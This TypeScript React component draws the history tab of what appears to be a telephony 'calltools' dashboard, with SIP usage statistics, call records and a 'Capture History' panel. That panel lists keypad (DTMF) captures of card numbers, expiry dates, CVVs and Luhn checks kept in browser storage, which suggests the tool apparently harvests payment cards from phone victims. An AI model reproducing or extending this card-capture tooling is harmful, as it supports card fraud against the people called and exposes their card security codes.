import { useState, useEffect, useCallback, useMemo, useRef } from 'react';
import { wsSend } from '../../hooks/useWebSocket';
import { useAuthStore } from '../../stores/authStore';
import { useWsMessage } from '../../hooks/useWsMessage';
import type { SipUsageEntry, SipUsageTotals, TopDestination } from '@calltools/shared';

type SortCol = 'sip_user' | 'total_calls' | 'answered' | 'failed' | 'total_seconds' | 'cost' | 'success_rate';
type SortDir = 1 | -1;

function SipUsagePanel() {
  const [usage, setUsage] = useState<SipUsageEntry[]>([]);
  const [totals, setTotals] = useState<SipUsageTotals>({ total_calls: 0, answered: 0, failed: 0, total_seconds: 0, total_cost: 0 });
  const [hourly, setHourly] = useState<number[]>([]);
  const [topDest, setTopDest] = useState<TopDestination[]>([]);
  const [shiftLabel, setShiftLabel] = useState('Current Shift');
  const [sortCol, setSortCol] = useState<SortCol>('total_calls');
  const [sortDir, setSortDir] = useState<SortDir>(-1);
  const selectedSip = useAuthStore(s => s.selectedSipUser);

  const handleUsageData = useCallback((e: Event) => {
    const msg = (e as CustomEvent).detail;
    setUsage(msg.sip_usage || []);
    setTotals(msg.totals || { total_calls: 0, answered: 0, failed: 0, total_seconds: 0, total_cost: 0 });
    setHourly(msg.hourly || []);
    setTopDest(msg.top_destinations || []);

    if (msg.shift_start) {
      try {
        const sd = new Date(msg.shift_start.replace(' ', 'T') + '+05:00');
        if (!isNaN(sd.getTime())) {
          const shiftStr = sd.toLocaleString(undefined, { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
          setShiftLabel('Shift: ' + shiftStr + ' \u2192 now');
        }
      } catch {
        setShiftLabel('Current Shift');
      }
    } else {
      setShiftLabel('Current Shift');
    }
  }, []);

  // Build SIP usage request with selected SIP/account filter
  const fetchUsage = useCallback(() => {
    const params: any = { cmd: 'get_sip_usage' };
    if (selectedSip) {
      if (selectedSip.startsWith('account:')) {
        params.target_account = selectedSip.slice('account:'.length);
      } else {
        params.target_sip = selectedSip;
      }
    }
    wsSend(params);
  }, [selectedSip]);

  useEffect(() => {
    window.addEventListener('sip_usage_data', handleUsageData);
    fetchUsage();
    return () => {
      window.removeEventListener('sip_usage_data', handleUsageData);
    };
  }, [handleUsageData, fetchUsage]);

  function handleSort(col: SortCol) {
    if (sortCol === col) {
      setSortDir((d) => (d === -1 ? 1 : -1) as SortDir);
    } else {
      setSortCol(col);
      setSortDir(col === 'sip_user' ? 1 : -1);
    }
  }

  // Sort usage data
  const sortedUsage = useMemo(() => {
    const sorted = [...usage];
    sorted.sort((a, b) => {
      const av = a[sortCol] ?? 0;
      const bv = b[sortCol] ?? 0;
      if (typeof av === 'string' && typeof bv === 'string') {
        return av.localeCompare(bv) * sortDir;
      }
      return ((av as number) - (bv as number)) * sortDir;
    });
    return sorted;
  }, [usage, sortCol, sortDir]);

  const totalMin = Math.floor((totals.total_seconds || 0) / 60);
  const totalSec = Math.round((totals.total_seconds || 0) % 60);

  const cols: { key: SortCol; label: string }[] = [
    { key: 'sip_user', label: 'SIP User' },
    { key: 'total_calls', label: 'Calls' },
    { key: 'answered', label: 'Answered' },
    { key: 'failed', label: 'Failed' },
    { key: 'total_seconds', label: 'Minutes' },
    { key: 'cost', label: 'Cost' },
    { key: 'success_rate', label: 'Success' },
  ];

  function getArrow(col: SortCol): string {
    if (sortCol !== col) return '';
    return sortDir === -1 ? ' \u25BC' : ' \u25B2';
  }

  // Peak hours
  const maxH = hourly.length > 0 ? Math.max(...hourly) || 1 : 1;

  return (
    <div className="glass-panel mb-4">
      {/* Header */}
      <div
        className="flex items-center justify-between px-[18px] py-3 rounded-t-lg"
        style={{ background: 'rgba(22, 27, 34, 0.6)', borderBottom: '1px solid rgba(30, 42, 58, 0.5)' }}
      >
        <h2 className="text-base font-semibold" style={{ color: '#c9d1d9' }}>SIP Usage Summary</h2>
        <div className="flex gap-2 items-center">
          <span style={{ fontSize: '11px', color: '#8b949e' }}>{shiftLabel}</span>
          <button
            onClick={fetchUsage}
            className="px-3 py-1 text-xs font-medium rounded-lg border"
            style={{ background: 'transparent', borderColor: '#30363d', color: '#c9d1d9', cursor: 'pointer' }}
          >
            Refresh
          </button>
        </div>
      </div>

      {/* Totals cards */}
      <div className="grid grid-cols-2 sm:grid-cols-5 gap-3 p-[18px]">
        <StatCard label="Total Calls" value={String(totals.total_calls || 0)} />
        <StatCard label="Answered" value={String(totals.answered || 0)} color="#3fb950" />
        <StatCard label="Failed" value={String(totals.failed || 0)} color="#f85149" />
        <StatCard label="Minutes" value={`${totalMin}m ${totalSec}s`} />
        <StatCard label="Total Cost" value={`$${(totals.total_cost || 0).toFixed(2)}`} color="#d29922" />
      </div>

      {/* Per-SIP table */}
      <div className="overflow-x-auto px-[18px] pb-3">
        {sortedUsage.length === 0 ? (
          <div style={{ color: '#484f58', textAlign: 'center', padding: '20px', fontSize: '13px' }}>
            No usage data found.
          </div>
        ) : (
          <table className="w-full" style={{ borderCollapse: 'collapse' }}>
            <thead>
              <tr style={{ borderBottom: '1px solid #30363d' }}>
                {cols.map((c) => (
                  <th
                    key={c.key}
                    onClick={() => handleSort(c.key)}
                    style={{
                      cursor: 'pointer',
                      textAlign: 'left',
                      padding: '8px 10px',
                      fontSize: '12px',
                      fontWeight: 600,
                      color: '#8b949e',
                      whiteSpace: 'nowrap',
                      userSelect: 'none',
                    }}
                  >
                    {c.label}{getArrow(c.key)}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody>
              {sortedUsage.map((u) => {
                const dur = u.total_seconds || 0;
                const durStr = Math.floor(dur / 60) + 'm ' + Math.round(dur % 60) + 's';
                const rate = u.success_rate || 0;
                const rateColor = rate >= 80 ? '#3fb950' : rate >= 50 ? '#d29922' : '#f85149';
                const barWidth = Math.min(rate, 100);
                return (
                  <tr key={u.sip_user} style={{ borderBottom: '1px solid #21262d' }}>
                    <td style={{ padding: '8px 10px', fontWeight: 600, fontSize: '13px', color: '#c9d1d9' }}>{u.sip_user}</td>
                    <td style={{ padding: '8px 10px', fontSize: '13px', color: '#c9d1d9' }}>{u.total_calls}</td>
                    <td style={{ padding: '8px 10px', fontSize: '13px', color: '#3fb950' }}>{u.answered}</td>
                    <td style={{ padding: '8px 10px', fontSize: '13px', color: '#f85149' }}>{u.failed}</td>
                    <td style={{ padding: '8px 10px', fontSize: '13px', color: '#c9d1d9' }}>{durStr}</td>
                    <td style={{ padding: '8px 10px', fontSize: '13px', color: '#c9d1d9' }}>${(u.cost || 0).toFixed(2)}</td>
                    <td style={{ padding: '8px 10px' }}>
                      <div className="flex items-center gap-1.5">
                        <div style={{ width: '60px', height: '8px', background: '#21262d', borderRadius: '4px', overflow: 'hidden' }}>
                          <div style={{ width: `${barWidth}%`, height: '100%', background: rateColor, borderRadius: '4px' }} />
                        </div>
                        <span style={{ color: rateColor, fontSize: '12px', fontWeight: 600 }}>{rate}%</span>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        )}
      </div>

      {/* Peak Hours + Top Destinations side by side */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 px-[18px] pb-[18px]">
        {/* Peak Hours Chart */}
        <div>
          {hourly.length > 0 && hourly.some((v) => v > 0) && (
            <>
              <div style={{ fontSize: '13px', fontWeight: 600, color: '#c9d1d9', marginBottom: '10px' }}>Peak Hours (24h)</div>
              <div className="flex flex-col gap-0.5">
                {Array.from({ length: 24 }, (_, h) => {
                  const cnt = hourly[h] || 0;
                  const pct = Math.round((cnt / maxH) * 100);
                  const barColor = pct >= 80 ? '#58a6ff' : pct >= 50 ? '#388bfd' : '#1f6feb';
                  const hrLabel = String(h).padStart(2, '0');
                  return (
                    <div key={h} className="flex items-center gap-1.5" style={{ height: '16px' }}>
                      <span style={{ fontSize: '11px', color: '#8b949e', width: '20px', textAlign: 'right', fontFamily: 'monospace' }}>
                        {hrLabel}
                      </span>
                      <div style={{ flex: 1, height: '10px', background: '#21262d', borderRadius: '3px', overflow: 'hidden' }}>
                        <div
                          style={{
                            width: `${pct}%`,
                            height: '100%',
                            background: barColor,
                            borderRadius: '3px',
                            transition: 'width 0.3s',
                          }}
                        />
                      </div>
                      <span style={{ fontSize: '10px', color: '#8b949e', width: '30px' }}>
                        {cnt > 0 ? cnt : ''}
                      </span>
                    </div>
                  );
                })}
              </div>
            </>
          )}
        </div>

        {/* Top Destinations */}
        <div>
          {topDest.length > 0 && (
            <>
              <div style={{ fontSize: '13px', fontWeight: 600, color: '#c9d1d9', marginBottom: '10px' }}>Top Destinations</div>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <thead>
                  <tr style={{ borderBottom: '1px solid #30363d' }}>
                    <th style={{ textAlign: 'left', padding: '4px 6px', fontSize: '11px', color: '#8b949e' }}>Number</th>
                    <th style={{ textAlign: 'right', padding: '4px 6px', fontSize: '11px', color: '#8b949e' }}>Calls</th>
                    <th style={{ textAlign: 'right', padding: '4px 6px', fontSize: '11px', color: '#8b949e' }}>Duration</th>
                    <th style={{ textAlign: 'right', padding: '4px 6px', fontSize: '11px', color: '#8b949e' }}>Cost</th>
                  </tr>
                </thead>
                <tbody>
                  {topDest.map((d, i) => {
                    const dur = d.seconds || 0;
                    const durStr = Math.floor(dur / 60) + 'm ' + Math.round(dur % 60) + 's';
                    return (
                      <tr key={i} style={{ borderBottom: '1px solid #21262d' }}>
                        <td style={{ padding: '4px 6px', fontFamily: 'monospace', fontSize: '12px', color: '#c9d1d9' }}>{d.number}</td>
                        <td style={{ textAlign: 'right', padding: '4px 6px', fontSize: '12px', color: '#c9d1d9' }}>{d.calls}</td>
                        <td style={{ textAlign: 'right', padding: '4px 6px', fontSize: '12px', color: '#8b949e' }}>{durStr}</td>
                        <td style={{ textAlign: 'right', padding: '4px 6px', fontSize: '12px', color: '#d29922' }}>${(d.cost || 0).toFixed(2)}</td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </>
          )}
        </div>
      </div>
    </div>
  );
}

function StatCard({ label, value, color }: { label: string; value: string; color?: string }) {
  return (
    <div
      className="rounded-lg p-3 text-center"
      style={{ background: '#161b22', border: '1px solid #21262d' }}
    >
      <div style={{ fontSize: '20px', fontWeight: 700, color: color || '#c9d1d9', fontFamily: "'JetBrains Mono', monospace" }}>
        {value}
      </div>
      <div style={{ fontSize: '11px', color: '#8b949e', marginTop: '2px' }}>{label}</div>
    </div>
  );
}

// ── CDR Panel (V1 parity: search, date filters, pagination, status colors) ──

function CdrPanel() {
  const [records, setRecords] = useState<any[]>([]);
  const [total, setTotal] = useState(0);
  const [page, setPage] = useState(1);
  const [search, setSearch] = useState('');
  const [dateFrom, setDateFrom] = useState('');
  const [dateTo, setDateTo] = useState('');
  const selectedSip = useAuthStore(s => s.selectedSipUser);
  const role = useAuthStore(s => s.role);
  const perPage = 25;

  const cdrMsg = useWsMessage<any>('cdr_result');

  useEffect(() => {
    if (cdrMsg) {
      setRecords(cdrMsg.records ?? []);
      setTotal(cdrMsg.total ?? 0);
    }
  }, [cdrMsg]);

  const loadCdr = useCallback((p: number = 1) => {
    setPage(p);
    const params: any = { cmd: 'get_cdr', page: p, perPage };
    if (search.trim()) params.search = search.trim();
    if (dateFrom) params.dateFrom = dateFrom;
    if (dateTo) params.dateTo = dateTo;
    if (selectedSip) {
      if (selectedSip.startsWith('account:')) {
        params.targetAccount = selectedSip.slice('account:'.length);
      } else {
        params.targetSip = selectedSip;
      }
    }
    wsSend(params);
  }, [search, dateFrom, dateTo, selectedSip]);

  useEffect(() => { loadCdr(1); }, [selectedSip]);

  const totalPages = Math.ceil(total / perPage);

  const formatDur = (sec: number) => {
    if (!sec) return '0s';
    const m = Math.floor(sec / 60);
    const s = sec % 60;
    return m > 0 ? `${m}m ${s}s` : `${s}s`;
  };

  const formatDate = (dt: string) => {
    try {
      const d = new Date(dt.includes('T') ? dt : dt.replace(' ', 'T') + '+05:00');
      return d.toLocaleString(undefined, { month: '2-digit', day: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' });
    } catch { return dt; }
  };

  const statusColor = (s: string) => {
    const up = (s || '').toUpperCase();
    if (up === 'ANSWERED') return '#3fb950';
    if (up === 'BUSY') return '#d29922';
    return '#f85149';
  };

  return (
    <div className="glass-panel">
      <div className="panel-header">
        <h2>Call History</h2>
        <button onClick={() => loadCdr(page)} className="btn btn-sm">Refresh</button>
      </div>
      {/* Filters */}
      <div className="flex gap-2 px-4 py-3 border-b border-ct-border-solid flex-wrap items-end">
        <input type="text" value={search} onChange={e => setSearch(e.target.value)}
          placeholder="Search number..." className="form-input !text-sm !w-40"
          onKeyDown={e => e.key === 'Enter' && loadCdr(1)} />
        <input type="date" value={dateFrom} onChange={e => setDateFrom(e.target.value)}
          className="form-input !text-sm !w-36" />
        <input type="date" value={dateTo} onChange={e => setDateTo(e.target.value)}
          className="form-input !text-sm !w-36" />
        <button onClick={() => loadCdr(1)} className="btn btn-sm btn-primary">Search</button>
      </div>
      {/* Table */}
      {records.length === 0 ? (
        <div className="empty-state">No call records found.</div>
      ) : (
        <div className="overflow-x-auto">
          <table className="data-table">
            <thead>
              <tr>
                <th>Date</th>
                <th>From</th>
                <th>To</th>
                <th>Duration</th>
                <th>Status</th>
                <th>Cost</th>
              </tr>
            </thead>
            <tbody>
              {records.map((r, i) => (
                <tr key={r.id || i}>
                  <td className="font-mono text-xs whitespace-nowrap text-ct-muted">{formatDate(r.startTime || r.date || '')}</td>
                  <td className="font-mono text-xs">{r.src || r.callerNum || '—'}</td>
                  <td className="font-mono text-xs">{r.destination || r.calleeNum || '—'}</td>
                  <td className="text-xs">{formatDur(r.duration ?? r.sessiontime ?? 0)}</td>
                  <td><span style={{ color: statusColor(r.status || r.disposition || ''), fontWeight: 600, fontSize: '11px', textTransform: 'uppercase' }}>{(r.status || r.disposition || 'FAILED').toUpperCase()}</span></td>
                  <td className="font-mono text-xs">${(r.cost ?? r.sessionbill ?? 0).toFixed(2)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
      {/* Pagination */}
      {totalPages > 1 && (
        <div className="flex items-center justify-center gap-3 p-3 border-t border-ct-border-solid">
          <button onClick={() => loadCdr(page - 1)} disabled={page <= 1} className="btn btn-sm">&laquo; Prev</button>
          <span className="text-xs text-ct-muted">Page {page} of {totalPages} ({total} records)</span>
          <button onClick={() => loadCdr(page + 1)} disabled={page >= totalPages} className="btn btn-sm">Next &raquo;</button>
        </div>
      )}
    </div>
  );
}

// ── Capture History (V1: shows saved DTMF captures from localStorage) ──

function CaptureHistoryPanel() {
  const [captures, setCaptures] = useState<any[]>([]);

  useEffect(() => {
    try {
      const data = JSON.parse(localStorage.getItem('ct2_capture_history') || '[]');
      setCaptures(data);
    } catch { setCaptures([]); }
  }, []);

  const clearHistory = () => {
    localStorage.removeItem('ct2_capture_history');
    setCaptures([]);
  };

  return (
    <div className="glass-panel">
      <div className="panel-header">
        <h2>Capture History</h2>
        {captures.length > 0 && <button onClick={clearHistory} className="btn btn-sm btn-danger">Clear</button>}
      </div>
      {captures.length === 0 ? (
        <div className="empty-state">No captures recorded yet.</div>
      ) : (
        <div className="overflow-x-auto">
          <table className="data-table">
            <thead><tr><th>Time</th><th>CC</th><th>Exp</th><th>CVV</th><th>Luhn</th></tr></thead>
            <tbody>
              {captures.map((c, i) => (
                <tr key={i}>
                  <td className="text-xs text-ct-muted whitespace-nowrap">{new Date(c.timestamp).toLocaleString()}</td>
                  <td className="font-mono text-xs">{c.cc || '—'}</td>
                  <td className="font-mono text-xs">{c.exp || '—'}</td>
                  <td className="font-mono text-xs">{c.cvv || '—'}</td>
                  <td className="text-xs">{c.luhnValid === true ? <span style={{color:'#3fb950'}}>✓</span> : c.luhnValid === false ? <span style={{color:'#f85149'}}>✗</span> : '—'}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}

export function HistoryTab() {
  const role = useAuthStore((s) => s.role);
  const sipUsers = useAuthStore((s) => s.sipUsers);
  const permissions = useAuthStore((s) => s.permissions);
  // V1: SIP Usage visible for admin/user but only when CDR permission not disabled
  const showUsagePanel = (role === 'admin' || role === 'user' || (sipUsers && sipUsers.length > 1)) && permissions.cdr !== false;

  return (
    <div className="space-y-5 animate-fade-in" role="tabpanel" id="panel-history">
      {showUsagePanel && <SipUsagePanel />}
      <CdrPanel />
      <CaptureHistoryPanel />
    </div>
  );
}
